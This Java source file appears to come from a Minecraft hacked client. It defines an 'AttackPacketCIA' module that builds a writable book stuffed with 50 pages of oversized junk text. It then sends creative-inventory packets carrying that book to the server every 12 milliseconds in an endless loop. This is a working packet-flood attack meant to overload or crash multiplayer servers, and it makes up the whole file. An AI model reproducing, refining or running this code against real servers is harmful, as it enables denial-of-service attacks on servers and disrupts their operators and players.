package novola.zori.club.hack.hacks;

import novola.zori.club.hack.Hack;
import novola.zori.club.hack.HackCategory;
import novola.zori.club.utils.visual.ChatUtils;
import novola.zori.club.wrappers.Wrapper;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraftforge.fml.common.gameevent.TickEvent.ClientTickEvent;
import novola.zori.club.hack.HackCategory;
import novola.zori.club.wrappers.Wrapper;

public class AttackPacketCIA extends Hack{

	public AttackPacketCIA() {
		super("AttackPacketCIA", HackCategory.ANOTHER);
	}
	
	@Override
	public String getDescription() {
		return "Attack packets 'CPacketCreativeInventoryAction' on server.";
	}
	
	//By Dark Light Neron
	@Override
	public void onEnable() {
		new Thread() {
            @Override
            public void run() {
                try {
                    ChatUtils.warning("Attack...");
                    final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                    final NBTTagList list = new NBTTagList();
                    final NBTTagCompound tag = new NBTTagCompound();
                    final String author = Wrapper.INSTANCE.mc().getSession().getUsername();
                    final String title = "Title";
                    final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    for (int i = 0; i < 50; ++i) {
                        final String siteContent = size;
                        final NBTTagString tString = new NBTTagString(siteContent);
                        list.appendTag(tString);
                    }
                    
                    tag.setString("author", author);
                    tag.setString("title", title);
                    tag.setTag("pages", list);
                    bookObj.setTagInfo("pages", list);
                    bookObj.setTagCompound(tag);
                    
                    while (true) {
                    	Wrapper.INSTANCE.sendPacket(new CPacketCreativeInventoryAction(36, bookObj));
                        Thread.sleep(12L);
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
        this.setToggled(false);
		super.onEnable();
	}
}
